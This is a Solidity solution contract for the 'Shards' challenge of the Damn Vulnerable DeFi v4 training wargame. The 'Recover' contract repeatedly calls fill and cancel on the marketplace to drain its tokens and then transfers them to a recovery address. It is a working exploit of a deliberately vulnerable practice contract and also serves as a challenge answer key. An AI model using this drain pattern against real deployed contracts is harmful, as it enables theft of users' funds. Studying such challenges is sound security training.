// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {
    ShardsNFTMarketplace,
    IShardsNFTMarketplace,
    ShardsFeeVault,
    DamnValuableToken,
    DamnValuableNFT
} from "../../src/shards/ShardsNFTMarketplace.sol";
import {DamnValuableStaking} from "../../src/DamnValuableStaking.sol";

contract Recover {
    DamnValuableToken token;
    ShardsNFTMarketplace marketplace;
    address recovery;

    constructor(
        address _token,
        address _marketplace,
        address _recovery
    ) {
        token = DamnValuableToken(_token);
        marketplace = ShardsNFTMarketplace(_marketplace);
        recovery = _recovery;
    }

    function recover() public {
        for(uint256 i = 0; i <= 7518; i++) {
            marketplace.fill(1, 133);
            marketplace.cancel(1, i);
        }

        token.transfer(recovery, token.balanceOf(address(this)));
    }
}